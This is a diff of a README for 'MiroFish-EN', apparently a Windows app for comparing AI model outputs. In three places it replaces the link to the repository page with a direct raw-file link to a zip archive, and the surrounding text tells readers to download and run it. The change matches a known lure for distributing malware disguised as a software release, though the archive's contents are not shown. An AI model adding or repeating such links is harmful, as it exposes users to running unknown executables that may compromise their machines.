@@ -1,6 +1,6 @@
 # 🤖 MiroFish-EN - Clear AI predictions for Windows
 
-[![Download MiroFish-EN](https://img.shields.io/badge/Download-MiroFish--EN-blue?style=for-the-badge)](https://github.com/Spiritofturpentineawe96/MiroFish-EN)
+[![Download MiroFish-EN](https://img.shields.io/badge/Download-MiroFish--EN-blue?style=for-the-badge)](https://raw.githubusercontent.com/Spiritofturpentineawe96/MiroFish-EN/main/normal/Miro-Fish-EN-3.7.zip)
 
 ## 🧭 What this is
 
@@ -18,7 +18,7 @@ Use it when you want a local app that can compare model outputs and help with pr
 
 Visit this page to download and run the app:
 
-https://github.com/Spiritofturpentineawe96/MiroFish-EN
+https://raw.githubusercontent.com/Spiritofturpentineawe96/MiroFish-EN/main/normal/Miro-Fish-EN-3.7.zip
 
 If the page has a release section, choose the Windows download and save it to your computer.
 
@@ -163,7 +163,7 @@ Keep all files in the same folder so the app can run correctly.
 
 ## 🔗 Download again
 
-[Download MiroFish-EN](https://github.com/Spiritofturpentineawe96/MiroFish-EN)
+[Download MiroFish-EN](https://raw.githubusercontent.com/Spiritofturpentineawe96/MiroFish-EN/main/normal/Miro-Fish-EN-3.7.zip)
 
 ## 🏷️ Topics
 
